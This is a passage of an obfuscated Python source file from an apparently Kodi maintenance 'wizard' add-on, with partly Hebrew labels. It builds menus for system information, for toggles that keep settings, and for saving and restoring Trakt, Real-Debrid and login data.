	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2721
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2723
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2724
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2725
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2727
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO00O0OOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2728
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000OOOOO0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2729
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000000O00OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2730
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2732
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O00O0OOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2733
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO00O00O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2734
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO0O0000OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2735
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2737
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2738
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0OOOO00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2739
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0OOOOO0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2740
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00O00OO000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2741
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00O0O00O0O0OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2742
	O00O00O0000O00000 =len (OO00O00OO0O00OO0O )+len (O00000O000OOOOOOO )+len (O0OOOOO0OO0O0O0O0 )+len (OOO0OO00O000O0O00 )+len (O0O0O0O00OOOO0000 )+len (O0O00OO000O0OOOO0 )+len (O0OOOO00OOOO0OO0O )#line:2744
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O00O00O0000O00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2745
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO0OO0O0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2746
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO00O000O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2747
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000O000OOOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2748
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O00OO0O00OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2749
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO00OOOO0OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2750
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00OO000O0OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2751
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O0O00OOOO0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2752
def Menu ():#line:2753
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2754
def saveMenu ():#line:2756
	OOOO00O0OO0OO00OO ='[COLOR green]מופעל[/COLOR]';O0O0O0OO0000OO00O ='[COLOR red]מבוטל[/COLOR]'#line:2758
	O00O0O0O0OOO0O000 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2759
	OO0OOO00O000OOOOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:2760
	OOO0O0O00O00O00OO ='true'if KEEPINFO =='true'else 'false'#line:2761
	OO00OO0OO00O0OOO0 ='true'if KEEPSOUND =='true'else 'false'#line:2763
	OOO0O00O00000O00O ='true'if KEEPVIEW =='true'else 'false'#line:2764
	O00OO0O0OO0OOO000 ='true'if KEEPSKIN =='true'else 'false'#line:2765
	O0O0OO0OO0O0OOO00 ='true'if KEEPSKIN2 =='true'else 'false'#line:2766
	OO00O00O00000OOOO ='true'if KEEPSKIN3 =='true'else 'false'#line:2767
	OOOOOO000O0O00OO0 ='true'if KEEPADDONS =='true'else 'false'#line:2768
	O00OO0OOO00000OOO ='true'if KEEPPVR =='true'else 'false'#line:2769
	OO0O0O0OO00O00O0O ='true'if KEEPTVLIST =='true'else 'false'#line:2770
	O0O0OOO0O000O00O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2771
	O000O000O00000OO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2772
	OOOOOOO0O00OOOOO0 ='true'if KEEPHUBTV =='true'else 'false'#line:2773
	OO0OOO0OO0O00OO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:2774
	OOOO0O0O00OO0O0OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2775
	O000OOOOOO0OO0OOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2776
	OOO00O0O00OO000O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:2777
	O000000O00O00000O ='true'if KEEPPLAYLIST =='true'else 'false'#line:2778
	OO0O0OO00O00O0OOO ='true'if KEEPTRAKT =='true'else 'false'#line:2779
	OOO0O0OO00OO00000 ='true'if KEEPREAL =='true'else 'false'#line:2780
	O0O00OO0O000O0OOO ='true'if KEEPRD2 =='true'else 'false'#line:2781
	OO0OO0OOO0O0O00OO ='true'if KEEPTORNET =='true'else 'true'#line:2782
	O00O0OOOOO0O0OOO0 ='true'if KEEPLOGIN =='true'else 'false'#line:2783
	OOOO0O00OOOO0O0OO ='true'if KEEPSOURCES =='true'else 'false'#line:2784
	O0O00OO0O00000OO0 ='true'if KEEPADVANCED =='true'else 'false'#line:2785
	OO00OOO0000OO0O00 ='true'if KEEPPROFILES =='true'else 'false'#line:2786
	O000OOO0OOO0OOOO0 ='true'if KEEPFAVS =='true'else 'false'#line:2787
	OO00O0O0OOO00OO0O ='true'if KEEPREPOS =='true'else 'false'#line:2788
	O0O0000OOOOO00OOO ='true'if KEEPSUPER =='true'else 'false'#line:2789
	O00O0OOOOO0O00O00 ='true'if KEEPWHITELIST =='true'else 'false'#line:2790
	addFile ('אפשרויות','',themeit =THEME3 )#line:2794
	if O00O0OOOOO0O00O00 =='true':#line:2795
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2796
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2797
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2798
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2799
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2800
	addFile ('%s התקנת קיר סרטים: '%O00O0O0O0OOO0O000 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2802
	addFile ('%s שמירת חשבון RD: '%OOO0O0OO00OO00000 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2803
	addFile ('%s שמירת חשבון טראקט: '%OO0O0OO00O00O0OOO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2804
	addFile ('%s שמירת מועדפים: '%O000OOO0OOO0OOOO0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2807
	addFile ('%s שמירת לקוח טלוויזיה: '%O00OO0OOO00000OOO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2808
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OO0O0O0OO00O00O0O .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2809
	addFile ('%s שמירת אריח סרטים: '%O0O0OOO0O000O00O0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2810
	addFile ('%s שמירת אריח סדרות: '%O000O000O00000OO0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2811
	addFile ('%s שמירת אריח טלויזיה: '%OOOOOOO0O00OOOOO0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2812
	addFile ('%s שמירת אריח תוכן ישראלי: '%OO0OOO0OO0O00OO0O .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2813
	addFile ('%s שמירת אריח ילדים: '%OOOO0O0O00OO0O0OO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2814
	addFile ('%s שמירת אריח מוסיקה: '%O000OOOOOO0OO0OOO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2815
	addFile ('%s שמירת תפריט אריחים ראשי: '%OOO00O0O00OO000O0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2816
	addFile ('%s שמירת כל האריחים בסקין: '%O00OO0O0OO0OOO000 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2817
	addFile ('%s שמירת הרחבות שהתקנתי: '%OOOOOO000O0O00OO0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2824
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%OOO0O0O00O00O00OO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2825
	addFile ('%s שמירת ספריית סרטים וסדרות: '%OO0OOO00O000OOOOO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2828
	addFile ('%s שמירת מקורות וידאו: '%OOOO0O00OOOO0O0OO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2829
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OO00OO0OO00O0OOO0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2830
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%OOO0O00O00000O00O .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2832
	addFile ('%s שמירת פליליסט לאודר: '%O000000O00O00000O .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2833
	addFile ('%s שמירת הרחבות ידנית: '%O00O0OOOOO0O00O00 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2834
	addFile ('%s שמירת הגדרות באפר: '%O0O00OO0O00000OO0 .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2838
	addFile ('%s שמירת סופר מועדפים: '%O0O0000OOOOO00OOO .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2839
	addFile ('%s שמירת רשימות ריפו: '%OO00O0O0OOO00OO0O .replace ('true',OOOO00O0OO0OO00OO ).replace ('false',O0O0O0OO0000OO00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2840
	setView ('files','viewType')#line:2842
def traktMenu ():#line:2844
	O000OO00OO000O0O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2845
	O0O00O0O000OO000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2846
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2847
	addFile ('Save Trakt Data: %s'%O000OO00OO000O0O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2848
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O00O0O000OO000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2849
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2850
	for O000OO00OO000O0O0 in traktit .ORDER :#line:2852
		O0O0OO0O00O0OO0OO =TRAKTID [O000OO00OO000O0O0 ]['name']#line:2853
		O0O0O0OO00O00OO00 =TRAKTID [O000OO00OO000O0O0 ]['path']#line:2854
		OO00O0O0OOO0000OO =TRAKTID [O000OO00OO000O0O0 ]['saved']#line:2855
		O0O0OO00OO0O00OO0 =TRAKTID [O000OO00OO000O0O0 ]['file']#line:2856
		O00O0O0O00O0OO0OO =wiz .getS (OO00O0O0OOO0000OO )#line:2857
		O00O0O00OOOOO00O0 =traktit .traktUser (O000OO00OO000O0O0 )#line:2858
		OOOOOOOOOO0OOOOO0 =TRAKTID [O000OO00OO000O0O0 ]['icon']if os .path .exists (O0O0O0OO00O00OO00 )else ICONTRAKT #line:2859
		O0OOO00O00000OO0O =TRAKTID [O000OO00OO000O0O0 ]['fanart']if os .path .exists (O0O0O0OO00O00OO00 )else FANART #line:2860
		O0OOOO0000000O00O =createMenu ('saveaddon','Trakt',O000OO00OO000O0O0 )#line:2861
		O000O000OO00O0000 =createMenu ('save','Trakt',O000OO00OO000O0O0 )#line:2862
		O0OOOO0000000O00O .append ((THEME2 %'%s Settings'%O0O0OO0O00O0OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O000OO00OO000O0O0 )))#line:2863
		addFile ('[+]-> %s'%O0O0OO0O00O0OO0OO ,'',icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,themeit =THEME3 )#line:2865
		if not os .path .exists (O0O0O0OO00O00OO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,menu =O0OOOO0000000O00O )#line:2866
		elif not O00O0O00OOOOO00O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O000OO00OO000O0O0 ,icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,menu =O0OOOO0000000O00O )#line:2867
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0O00OOOOO00O0 ,'authtrakt',O000OO00OO000O0O0 ,icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,menu =O0OOOO0000000O00O )#line:2868
		if O00O0O0O00O0OO0OO =="":#line:2869
			if os .path .exists (O0O0OO00OO0O00OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O000OO00OO000O0O0 ,icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,menu =O000O000OO00O0000 )#line:2870
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O000OO00OO000O0O0 ,icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,menu =O000O000OO00O0000 )#line:2871
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0O0O00O0OO0OO ,'',icon =OOOOOOOOOO0OOOOO0 ,fanart =O0OOO00O00000OO0O ,menu =O000O000OO00O0000 )#line:2872
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2874
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2875
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2876
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2877
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2878
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2879
	setView ('files','viewType')#line:2880
def realMenu ():#line:2882
	O0000OO00O0O0O0OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2883
	O0OO0O0O0O00OO0OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2884
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2885
	addFile ('Save Real Debrid Data: %s'%O0000OO00O0O0O0OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2886
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OO0O0O0O00OO0OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:2887
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2888
	for OOOO000O000000OOO in debridit .ORDER :#line:2890
		OOOO00O00O00O0000 =DEBRIDID [OOOO000O000000OOO ]['name']#line:2891
		O0O0OO0OOOOOO0O0O =DEBRIDID [OOOO000O000000OOO ]['path']#line:2892
		O00O00OOO0O0OOOOO =DEBRIDID [OOOO000O000000OOO ]['saved']#line:2893
		OO000O0OO00000OO0 =DEBRIDID [OOOO000O000000OOO ]['file']#line:2894
		O000O0O0OOOO0O0O0 =wiz .getS (O00O00OOO0O0OOOOO )#line:2895
		O00OO0OO0OOO00O00 =debridit .debridUser (OOOO000O000000OOO )#line:2896
		O0000OOOOO0OOO0OO =DEBRIDID [OOOO000O000000OOO ]['icon']if os .path .exists (O0O0OO0OOOOOO0O0O )else ICONREAL #line:2897
		O00000OO00O000000 =DEBRIDID [OOOO000O000000OOO ]['fanart']if os .path .exists (O0O0OO0OOOOOO0O0O )else FANART #line:2898
		OO00O00OOO0OOO00O =createMenu ('saveaddon','Debrid',OOOO000O000000OOO )#line:2899
		OOO00O0OOOO0O0O0O =createMenu ('save','Debrid',OOOO000O000000OOO )#line:2900
		OO00O00OOO0OOO00O .append ((THEME2 %'%s Settings'%OOOO00O00O00O0000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOOO000O000000OOO )))#line:2901
		addFile ('[+]-> %s'%OOOO00O00O00O0000 ,'',icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,themeit =THEME3 )#line:2903
		if not os .path .exists (O0O0OO0OOOOOO0O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,menu =OO00O00OOO0OOO00O )#line:2904
		elif not O00OO0OO0OOO00O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOOO000O000000OOO ,icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,menu =OO00O00OOO0OOO00O )#line:2905
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OO0OO0OOO00O00 ,'authdebrid',OOOO000O000000OOO ,icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,menu =OO00O00OOO0OOO00O )#line:2906
		if O000O0O0OOOO0O0O0 =="":#line:2907
			if os .path .exists (OO000O0OO00000OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOOO000O000000OOO ,icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,menu =OOO00O0OOOO0O0O0O )#line:2908
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOOO000O000000OOO ,icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,menu =OOO00O0OOOO0O0O0O )#line:2909
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000O0O0OOOO0O0O0 ,'',icon =O0000OOOOO0OOO0OO ,fanart =O00000OO00O000000 ,menu =OOO00O0OOOO0O0O0O )#line:2910
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2912
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2913
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2914
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2915
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2916
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2917
	setView ('files','viewType')#line:2918
def loginMenu ():#line:2920
	OO0000OOO0000O0OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2921
	OO000O0OO0OO0O000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2922
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2923
	addFile ('Save Login Data: %s'%OO0000OOO0000O0OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2924
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO000O0OO0OO0O000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2925
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2926
	for OO0000OOO0000O0OO in loginit .ORDER :#line:2928
		OO000OOO0O0O000OO =LOGINID [OO0000OOO0000O0OO ]['name']#line:2929
		O00O0000O00OOO00O =LOGINID [OO0000OOO0000O0OO ]['path']#line:2930
		O0OO00OO0OO00OO0O =LOGINID [OO0000OOO0000O0OO ]['saved']#line:2931
		OOO000OOOOO00OO00 =LOGINID [OO0000OOO0000O0OO ]['file']#line:2932
		O00O0OOO0OOO00OO0 =wiz .getS (O0OO00OO0OO00OO0O )#line:2933
		OO00O000OOO0OO00O =loginit .loginUser (OO0000OOO0000O0OO )#line:2934
		OOOO0OO0O00O0OOO0 =LOGINID [OO0000OOO0000O0OO ]['icon']if os .path .exists (O00O0000O00OOO00O )else ICONLOGIN #line:2935
		OOOOO00O00OO000O0 =LOGINID [OO0000OOO0000O0OO ]['fanart']if os .path .exists (O00O0000O00OOO00O )else FANART #line:2936
		OO0O0OOO00O00O0O0 =createMenu ('saveaddon','Login',OO0000OOO0000O0OO )#line:2937
		OOO000OO0000O00OO =createMenu ('save','Login',OO0000OOO0000O0OO )#line:2938
		OO0O0OOO00O00O0O0 .append ((THEME2 %'%s Settings'%OO000OOO0O0O000OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0000OOO0000O0OO )))#line:2939
		addFile ('[+]-> %s'%OO000OOO0O0O000OO ,'',icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,themeit =THEME3 )#line:2941
		if not os .path .exists (O00O0000O00OOO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,menu =OO0O0OOO00O00O0O0 )#line:2942
		elif not OO00O000OOO0OO00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0000OOO0000O0OO ,icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,menu =OO0O0OOO00O00O0O0 )#line:2943
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O000OOO0OO00O ,'authlogin',OO0000OOO0000O0OO ,icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,menu =OO0O0OOO00O00O0O0 )#line:2944
		if O00O0OOO0OOO00OO0 =="":#line:2945
			if os .path .exists (OOO000OOOOO00OO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0000OOO0000O0OO ,icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,menu =OOO000OO0000O00OO )#line:2946
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0000OOO0000O0OO ,icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,menu =OOO000OO0000O00OO )#line:2947
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0OOO0OOO00OO0 ,'',icon =OOOO0OO0O00O0OOO0 ,fanart =OOOOO00O00OO000O0 ,menu =OOO000OO0000O00OO )#line:2948
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2950
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2951
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2952
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2953
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2954
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2955
	setView ('files','viewType')#line:2956
def fixUpdate ():#line:2958
	if KODIV <17 :#line:2959
		OO0000O0O0O0OO0O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2960
		try :#line:2961
			os .remove (OO0000O0O0O0OO0O0 )#line:2962
		except Exception as O0O0OO000000O0000 :#line:2963
